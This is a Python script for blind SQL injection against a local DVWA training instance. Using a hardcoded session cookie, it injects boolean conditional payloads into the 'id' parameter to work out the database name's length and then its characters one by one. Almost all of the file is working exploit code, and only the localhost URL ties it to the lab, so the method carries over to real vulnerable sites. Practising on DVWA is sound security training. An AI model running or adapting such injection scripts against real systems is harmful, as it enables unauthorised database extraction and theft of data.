#!/usr/bin/env python3   
# -*- coding: utf-8 -*-
import requests 
import re

url = "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1'"
head = {
    'Host': 'localhost',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://localhost/dvwa/vulnerabilities/sqli_blind/',
    'Cookie': 'security=low; PHPSESSID=spckp6fituhsllvs2d8r4sc935',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}
def database_name_length(url,head):
    for i in range(10):
        #http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1%27+and+if%28len%28select+database%28%29%29%3E100%2C1%2C0%29%23%2B&Submit=Submit#        
        #http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1%27+and+if(len((select+database())%3E0+%2C1%2C0)%23%2B&Submit=Submit
        #payload = url + '+and+if(len((select+database())%3E'+str(i)+'+%2C1%2C0)%23%2B&Submit=Submit'
        payload = url + ' and if(char_length(database())>' + str(i)  +',1,0) limit 1%23 &Submit=Submit#'        
        #payload = url + '+and+++if(+++++len(+++(select+database()+)%3E' + str(i)  +'++++%2C1%2C0)%23%2B'   
        print('testing length of database name= '+str(i))     
        #print(payload)
        response = requests.get(payload, headers = head)
        if(response.text==''):
            print('error')
            break
        #print(response.text)
        if ('MISSING' in response.text):
            print('length='+str(i))
            break
    return i

def database_name():
    #payload = url + ' and if(ascii(substr(database(),1,1))>33,1,0) limit 1%23 &Submit=Submit#'
    database_length = database_name_length(url,head)
    name = list()
    i = 1
    while(i<=database_length):
        asc = 33
        while(asc<127):
            payload = url + ' and if(ascii(substr(database(),'+str(i)+',1))>'+str(asc)+',1,0) limit 1%23 &Submit=Submit#'
            #print(payload)
            response = requests.get(payload, headers = head)
            if ('MISSING' in response.text):
                print(str(i)+':'+chr(asc))
                name.append(asc)
                break
            asc+=1
        i+=1
    return name
database_name()

